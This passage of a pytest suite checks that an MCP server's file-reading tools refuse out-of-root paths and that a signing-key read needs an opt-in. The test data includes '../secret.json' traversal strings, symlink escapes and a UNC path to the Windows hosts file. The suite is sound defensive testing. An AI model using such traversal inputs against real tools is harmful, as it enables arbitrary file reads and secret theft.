    proj.mkdir()
    monkeypatch.chdir(proj)
    current_path = proj / "current.json"
    _write_audit_manifest(current_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")

    out = mcp_server.tg_audit_diff(str(secret), str(current_path))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_previous_manifest_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    current_path = proj / "current.json"
    _write_audit_manifest(current_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")

    out = mcp_server.tg_audit_diff("../secret.json", str(current_path))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_previous_manifest_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    current_path = proj / "current.json"
    _write_audit_manifest(current_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")
    link = proj / "prev-link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_audit_diff(str(link), str(current_path))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_current_manifest_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    previous_path = proj / "previous.json"
    _write_audit_manifest(previous_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")

    out = mcp_server.tg_audit_diff(str(previous_path), str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_current_manifest_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    previous_path = proj / "previous.json"
    _write_audit_manifest(previous_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")

    out = mcp_server.tg_audit_diff(str(previous_path), "../secret.json")

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_diff_refuses_current_manifest_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    previous_path = proj / "previous.json"
    _write_audit_manifest(previous_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")
    link = proj / "current-link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_audit_diff(str(previous_path), str(link))

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_create_refuses_manifest_path_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_review_bundle_create(manifest_path=str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_create_refuses_manifest_path_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)

    out = mcp_server.tg_review_bundle_create(manifest_path="../secret.json")

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_create_refuses_manifest_path_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret)
    link = proj / "link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_review_bundle_create(manifest_path=str(link))

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_create_refuses_scan_path_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "manifest.json"
    _write_audit_manifest(manifest_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="findings")

    out = mcp_server.tg_review_bundle_create(
        manifest_path=str(manifest_path), scan_path=str(secret)
    )

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_create_refuses_previous_manifest_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "manifest.json"
    _write_audit_manifest(manifest_path)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="reviewer")

    out = mcp_server.tg_review_bundle_create(
        manifest_path=str(manifest_path), previous_manifest=str(secret)
    )

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_verify_refuses_bundle_path_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="bundle_sha256")

    out = mcp_server.tg_review_bundle_verify(str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_verify_refuses_bundle_path_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="bundle_sha256")

    out = mcp_server.tg_review_bundle_verify("../secret.json")

    _assert_audit7_refused_no_leak(out)


def test_tg_review_bundle_verify_refuses_bundle_path_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.json"
    _write_audit7_secret(secret, field="bundle_sha256")
    link = proj / "link.json"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_review_bundle_verify(str(link))

    _assert_audit7_refused_no_leak(out)


# round-7 security (audit #81 #1/#2/#12): MCP read-path exfil cluster ---------------------
#
# tg_classify_logs (file_path) and tg_ruleset_scan (baseline_path/suppressions_path) forwarded
# LLM-supplied read paths straight to a reader/loader with ZERO confinement -- an
# arbitrary-file-read/exfil primitive reachable from any MCP client. tg_classify_logs also
# fully materialized the target file into memory (`list(reader.read_lines(file_path))`)
# BEFORE applying its DEFAULT_CLASSIFY_MAX_LINES budget -- an unbounded-memory DoS on a large
# (or attacker-influenceable) file. tg_audit_manifest_verify's signing_key (HMAC key material)
# was read unrestricted while its twin audit_signing_key on tg_rewrite_apply was already gated
# behind an explicit opt-in (round-5) -- this closes that inconsistency too.
# `_confine_read_path` is the new read-labeled chokepoint (a thin wrapper on
# `_confine_write_path`, which round-6/audit #7 already generalized to reads) so a new
# read-path param has an obvious place to route through instead of being forwarded raw.


def test_confine_read_path_refuses_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    anchor = tmp_path / "proj"
    anchor.mkdir()
    with pytest.raises(ValueError):
        mcp_server._confine_read_path("../evil.log", anchor, label="file_path")
    with pytest.raises(ValueError):
        mcp_server._confine_read_path(str(tmp_path / "evil.log"), anchor, label="file_path")
    ok = mcp_server._confine_read_path("app.log", anchor, label="file_path")
    assert ok == (anchor.resolve() / "app.log")


@pytest.mark.skipif(os.name != "nt", reason="UNC paths are absolute only on Windows")
def test_confine_read_path_refuses_unc_path(tmp_path):
    """A UNC path is absolute (outside any local anchor) and must be refused like any other
    out-of-root absolute path. Uses \\\\localhost\\... (loopback, resolves in milliseconds,
    no real network I/O) rather than an unreachable host, per anti-hang-test-protocol.

    Windows-only (skipif-guarded): a UNC path (``Path(r"\\\\localhost\\...").is_absolute()``)
    is absolute ONLY on Windows. On POSIX it is NOT absolute, so `_confine_write_path` joins it
    UNDER the anchor instead of refusing it -- the confinement CODE is correct on both
    platforms (a UNC string can't escape the anchor on POSIX either way), this test's
    ASSERTION (raises ValueError) is just Windows-specific, so it must not run on
    ubuntu-latest/macos-latest CI legs (audit #81 fix-council item #1)."""
    from tensor_grep.cli import mcp_server

    anchor = tmp_path / "proj"
    anchor.mkdir()
    unc = r"\\localhost\C$\Windows\System32\drivers\etc\hosts"
    with pytest.raises(ValueError):
        mcp_server._confine_read_path(unc, anchor, label="file_path")


def test_tg_classify_logs_refuses_file_path_outside_root(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.log"
    secret.write_text(f"ERROR {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")

    out = mcp_server.tg_classify_logs(str(secret))

    _assert_audit7_refused_no_leak(out)


def test_tg_classify_logs_refuses_file_path_dotdot_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.log"
    secret.write_text(f"ERROR {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")

    out = mcp_server.tg_classify_logs("../secret.log")

    _assert_audit7_refused_no_leak(out)


def test_tg_classify_logs_refuses_file_path_symlink_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    secret = tmp_path / "secret.log"
    secret.write_text(f"ERROR {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")
    link = proj / "app.log"
    try:
        link.symlink_to(secret)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_classify_logs(str(link))

    _assert_audit7_refused_no_leak(out)


@pytest.mark.skipif(os.name != "nt", reason="UNC paths are absolute only on Windows")
def test_tg_classify_logs_refuses_file_path_unc_escape(tmp_path, monkeypatch):
    """Windows-only (skipif-guarded): passes accidentally on POSIX (a UNC string is not
    `.is_absolute()` there, so it never hits the refusal path the assertion checks for) --
    see test_confine_read_path_refuses_unc_path above for the full rationale. Skipped here too
    for honesty, not just to stop a failure (audit #81 fix-council item #1)."""
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)

    out = mcp_server.tg_classify_logs(r"\\localhost\C$\Windows\System32\drivers\etc\hosts")

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_input"


def test_tg_classify_logs_accepts_relative_in_root_path(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("TENSOR_GREP_CLASSIFY_PROVIDER", raising=False)
    (tmp_path / "app.log").write_text("INFO ok\nERROR boom\n", encoding="utf-8")

    out = mcp_server.tg_classify_logs("app.log")

    parsed = json.loads(out)
    assert parsed.get("error") is None
    assert parsed["provider"] == "heuristic"


def test_tg_classify_logs_bounds_read_before_materializing(tmp_path, monkeypatch):
    """FAILS pre-fix (`list(reader.read_lines(file_path))` drains the whole generator before
    the DEFAULT_CLASSIFY_MAX_LINES budget is applied -- unbounded-memory DoS on a large file);
    PASSES post-fix (only DEFAULT_CLASSIFY_MAX_LINES + 1 lines are ever pulled from the
    reader). The fake reader below yields a large-but-FINITE number of lines (not an
    unbounded/infinite generator), so a still-broken implementation fails the assertion below
    instead of hanging the test runner (anti-hang-test-protocol)."""
    from tensor_grep.cli import mcp_server
    from tensor_grep.io.reader_fallback import FallbackReader
    from tensor_grep.sidecar import DEFAULT_CLASSIFY_MAX_LINES

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    (proj / "huge.log").write_text("placeholder\n", encoding="utf-8")
    monkeypatch.delenv("TENSOR_GREP_CLASSIFY_PROVIDER", raising=False)

    consumed = {"count": 0}
    fake_total_lines = DEFAULT_CLASSIFY_MAX_LINES * 50  # large but finite

    def _fake_read_lines(self, file_path):
        for _ in range(fake_total_lines):
            consumed["count"] += 1
            yield "INFO line\n"

    monkeypatch.setattr(FallbackReader, "read_lines", _fake_read_lines)

    out = mcp_server.tg_classify_logs("huge.log")

    parsed = json.loads(out)
    assert parsed.get("error") is None
    # the reader must be capped one line past the budget, never drained anywhere near in full.
    assert consumed["count"] == DEFAULT_CLASSIFY_MAX_LINES + 1
    assert consumed["count"] < fake_total_lines
    assert parsed["sample_lines"] == DEFAULT_CLASSIFY_MAX_LINES
    assert parsed["total_lines"] == DEFAULT_CLASSIFY_MAX_LINES + 1


def test_ruleset_scan_refuses_baseline_path_outside_root(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    escape = tmp_path / "evil_baseline.json"
    _write_audit7_secret(escape)

    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), baseline_path=str(escape)
    )

    _assert_audit7_refused_no_leak(out)


def test_ruleset_scan_refuses_baseline_path_dotdot_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    escape = tmp_path / "evil_baseline.json"
    _write_audit7_secret(escape)

    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), baseline_path="../evil_baseline.json"
    )

    _assert_audit7_refused_no_leak(out)


def test_ruleset_scan_refuses_baseline_path_symlink_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    outside_target = tmp_path / "outside-baseline.json"
    _write_audit7_secret(outside_target)
    link_path = scan_root / "baseline.json"
    try:
        link_path.symlink_to(outside_target)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted in this environment")

    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), baseline_path="baseline.json"
    )

    _assert_audit7_refused_no_leak(out)


def test_ruleset_scan_refuses_suppressions_path_outside_root(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    escape = tmp_path / "evil_suppressions.json"
    _write_audit7_secret(escape)

    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), suppressions_path=str(escape)
    )

    _assert_audit7_refused_no_leak(out)


def test_ruleset_scan_refuses_suppressions_path_dotdot_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    escape = tmp_path / "evil_suppressions.json"
    _write_audit7_secret(escape)

    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic",
        path=str(scan_root),
        suppressions_path="../evil_suppressions.json",
    )

    _assert_audit7_refused_no_leak(out)


def test_tg_audit_manifest_verify_refuses_signing_key_without_opt_in(tmp_path, monkeypatch):
    """FAILS pre-fix (signing_key forwarded to verify_audit_manifest_json unconditionally, an
    arbitrary-file-read-as-HMAC-key primitive); PASSES post-fix (refused with
    code="unsupported_option" unless TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ=1, mirroring
    tg_rewrite_apply's audit_signing_key gate)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", raising=False)
    manifest_path = tmp_path / "rewrite-audit.json"
    signing_key_path = tmp_path / "audit.key"
    signing_key = b"top-secret"
    signing_key_path.write_bytes(signing_key)
    _write_audit_manifest(manifest_path, signing_key=signing_key)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path),
        signing_key=str(signing_key_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"


# --- round-7 coverage: enumerate every MCP read-path tool param and assert each rejects an
# out-of-root candidate (audit #81's "coverage test" recommendation). Covers both the
# round-6 (audit #7) params and the round-7 (audit #81) params added above -- if a future
# read-path param is added without confinement, add a case here too.


def _read_path_case_classify_logs(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "secret.log"
    escape.write_text(f"ERROR {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")
    return mcp_server.tg_classify_logs(str(escape))


def _read_path_case_ruleset_scan_baseline(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "scan"
    scan_root.mkdir()
    escape = tmp_path / "baseline.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), baseline_path=str(escape)
    )


def _read_path_case_ruleset_scan_suppressions(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "scan"
    scan_root.mkdir()
    escape = tmp_path / "suppressions.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), suppressions_path=str(escape)
    )


def _read_path_case_audit_manifest_verify_manifest(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "manifest.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_audit_manifest_verify(str(escape))


def _read_path_case_audit_manifest_verify_previous(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "manifest.json"
    _write_audit_manifest(manifest_path)
    escape = tmp_path / "previous.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_audit_manifest_verify(str(manifest_path), previous_manifest=str(escape))


def _read_path_case_audit_diff_previous(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    current_path = proj / "current.json"
    _write_audit_manifest(current_path)
    escape = tmp_path / "previous.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_audit_diff(str(escape), str(current_path))


def _read_path_case_audit_diff_current(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    previous_path = proj / "previous.json"
    _write_audit_manifest(previous_path)
    escape = tmp_path / "current.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_audit_diff(str(previous_path), str(escape))


def _read_path_case_review_bundle_create_manifest(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "manifest.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_review_bundle_create(manifest_path=str(escape))


def _read_path_case_review_bundle_create_scan(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "manifest.json"
    _write_audit_manifest(manifest_path)
    escape = tmp_path / "scan.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_review_bundle_create(
        manifest_path=str(manifest_path), scan_path=str(escape)
    )


def _read_path_case_review_bundle_create_previous(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    manifest_path = proj / "manifest.json"
    _write_audit_manifest(manifest_path)
    escape = tmp_path / "previous.json"
    _write_audit7_secret(escape)
    return mcp_server.tg_review_bundle_create(
        manifest_path=str(manifest_path), previous_manifest=str(escape)
    )


def _read_path_case_review_bundle_verify_bundle(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "bundle.json"
    _write_audit7_secret(escape, field="bundle_sha256")
    return mcp_server.tg_review_bundle_verify(str(escape))


# --- round-7 coverage gap (Opus adversarial gate on #81, fix-council item #2): the #74 file-
# dependency primitives (tg_file_imports/tg_file_importers/tg_session_file_importers) and
# tg_rewrite_apply's `policy` param were missed by the original round-7 sweep above -- same
# class (a caller-named read path forwarded unconfined, echoing file existence / import
# strings / policy-schema details back to the caller). Closed the same way: confine-then-
# forward through `_confine_read_path`, structured invalid_input on reject.


def _read_path_case_file_imports(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "secret.py"
    escape.write_text(f"# {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")
    return mcp_server.tg_file_imports(str(escape))


def _read_path_case_file_importers(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    monkeypatch.chdir(proj)
    escape = tmp_path / "secret.py"
    escape.write_text(f"# {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")
    return mcp_server.tg_file_importers(str(escape), path=str(proj))


def _read_path_case_session_file_importers(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    # round-8 (audit #95): tg_session_open's `path` is now confined to the MCP root (cwd);
    # chdir to tmp_path so `project` (a subdirectory) is in-root while `escape` (a SIBLING of
    # project, still under tmp_path/cwd) stays correctly outside the session_root=project
    # anchor this case is actually testing.
    monkeypatch.chdir(tmp_path)
    project = tmp_path / "project"
    project.mkdir()
    (project / "app.py").write_text("x = 1\n", encoding="utf-8")
    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]
    escape = tmp_path / "secret.py"
    escape.write_text(f"# {_AUDIT7_SECRET_MARKER}\n", encoding="utf-8")
    return mcp_server.tg_session_file_importers(session_id, str(escape), str(project))


def _read_path_case_rewrite_apply_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    escape = tmp_path / "policy.json"
    _write_audit7_secret(escape, field="version")
    return mcp_server.tg_rewrite_apply(
        pattern="x", replacement="y", lang="python", path=str(proj), policy=str(escape)
    )


_READ_PATH_COVERAGE_CASES = [
    pytest.param(_read_path_case_classify_logs, id="tg_classify_logs.file_path"),
    pytest.param(_read_path_case_ruleset_scan_baseline, id="tg_ruleset_scan.baseline_path"),
    pytest.param(_read_path_case_ruleset_scan_suppressions, id="tg_ruleset_scan.suppressions_path"),
    pytest.param(
        _read_path_case_audit_manifest_verify_manifest,
        id="tg_audit_manifest_verify.manifest_path",
    ),
    pytest.param(
        _read_path_case_audit_manifest_verify_previous,
        id="tg_audit_manifest_verify.previous_manifest",
    ),
    pytest.param(_read_path_case_audit_diff_previous, id="tg_audit_diff.previous_manifest"),
    pytest.param(_read_path_case_audit_diff_current, id="tg_audit_diff.current_manifest"),
    pytest.param(
        _read_path_case_review_bundle_create_manifest,
        id="tg_review_bundle_create.manifest_path",
    ),
    pytest.param(_read_path_case_review_bundle_create_scan, id="tg_review_bundle_create.scan_path"),
    pytest.param(
        _read_path_case_review_bundle_create_previous,
        id="tg_review_bundle_create.previous_manifest",
    ),
    pytest.param(
        _read_path_case_review_bundle_verify_bundle, id="tg_review_bundle_verify.bundle_path"
    ),
    pytest.param(_read_path_case_file_imports, id="tg_file_imports.file"),
    pytest.param(_read_path_case_file_importers, id="tg_file_importers.file"),
    pytest.param(_read_path_case_session_file_importers, id="tg_session_file_importers.file"),
    pytest.param(_read_path_case_rewrite_apply_policy, id="tg_rewrite_apply.policy"),
]


@pytest.mark.parametrize("case", _READ_PATH_COVERAGE_CASES)
def test_read_path_param_coverage_rejects_out_of_root(tmp_path, monkeypatch, case):
    out = case(tmp_path, monkeypatch)

    _assert_audit7_refused_no_leak(out)


# --- positive-path regression guards: confining the four params above must not break a
# legitimate in-root call (Opus adversarial gate on #81, fix-council item #2).


def test_tg_file_imports_accepts_in_root_path(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)
    (tmp_path / "util.js").write_text("export function foo() {}\n", encoding="utf-8")
    consumer = tmp_path / "consumer.js"
    consumer.write_text('import { foo } from "./util";\n', encoding="utf-8")

    out = mcp_server.tg_file_imports("consumer.js")

    parsed = json.loads(out)
    assert parsed.get("error") is None
    assert parsed["imports"][0]["module"] == "./util"
    assert parsed["imports"][0]["resolved"] == str((tmp_path / "util.js").resolve())


def test_tg_file_importers_accepts_in_root_path(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    project.mkdir()
    target = project / "util.js"
    target.write_text("export function foo() {}\n", encoding="utf-8")
    consumer = project / "consumer.js"
    consumer.write_text('import { foo } from "./util";\n', encoding="utf-8")
    monkeypatch.chdir(project)

    out = mcp_server.tg_file_importers("util.js", path=str(project))

    parsed = json.loads(out)
    assert parsed.get("error") is None
    assert parsed["importer_files"] == [str(consumer.resolve())]


def test_tg_session_file_importers_accepts_in_root_path(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    project.mkdir()
    target = project / "util.js"
    target.write_text("export function foo() {}\n", encoding="utf-8")
    consumer = project / "consumer.js"
    consumer.write_text('import { foo } from "./util";\n', encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    out = mcp_server.tg_session_file_importers(session_id, "util.js", str(project))

    parsed = json.loads(out)
    assert parsed.get("error") is None
    assert parsed["importer_files"] == [str(consumer.resolve())]


def test_tg_rewrite_apply_accepts_policy_within_scan_root(tmp_path, monkeypatch):
    """VERIFY confining `policy` (round-7 fix, Opus gate item #2) does not regress a
    legitimate in-root policy: a policy file inside the scan root must reach
    load_apply_policy's OWN schema validation (code="invalid_policy") rather than being
    refused by the new confinement check (which would instead surface code="invalid_input"
    with a "must stay within" message)."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    policy_path = proj / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
            # deliberately omit on_failure: pins the failure to load_apply_policy's schema
            # validation, proving execution got PAST the new path-confinement check below.
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(proj),
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_policy"
    assert any(detail["field"] == "on_failure" for detail in parsed["error"]["details"])


def test_tg_rewrite_apply_accepts_co_located_policy_for_single_file_target(tmp_path, monkeypatch):
    """audit #76 (Opus-gate nit on #464): when `path` is a single FILE (a targeted rewrite),
    a policy co-located in the file's directory must reach load_apply_policy's schema
    validation (code="invalid_policy"), NOT be fail-closed-refused by confinement
    (code="invalid_input"). Pre-fix the policy anchor was the file itself, which has no
    descendants, so any co-located policy was rejected."""
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    target = proj / "sample.py"
    target.write_text("def add(x, y): return x + y\n", encoding="utf-8")
    policy_path = proj / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
            # omit on_failure: pins the failure to load_apply_policy's schema validation,
            # proving execution got PAST the path-confinement check with path=a single file.
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(target),  # a FILE, not a directory
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_policy"
    assert any(detail["field"] == "on_failure" for detail in parsed["error"]["details"])


def test_tg_rewrite_apply_still_rejects_policy_outside_single_file_target_dir(tmp_path):
    """audit #76: anchoring the policy to the target FILE's parent directory (so a co-located
    policy works) must NOT widen confinement -- a policy OUTSIDE the target's directory is still
    fail-closed refused (code="invalid_input"), preserving the #464 exfil guard."""
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    target = proj / "sample.py"
    target.write_text("def add(x, y): return x + y\n", encoding="utf-8")
    # sibling of proj/, i.e. OUTSIDE the target file's parent directory
    escape = tmp_path / "outside-policy.json"
    escape.write_text(json.dumps({"version": 1}), encoding="utf-8")

    out = mcp_server.tg_rewrite_apply(
        pattern="x",
        replacement="y",
        lang="python",
        path=str(target),
        policy=str(escape),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_input"


def test_tg_checkpoint_mcp_tools_wrap_checkpoint_store(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    project.mkdir()
    target = project / "sample.py"
    target.write_text("value = 1\n", encoding="utf-8")

    created = json.loads(mcp_server.tg_checkpoint_create(str(project)))
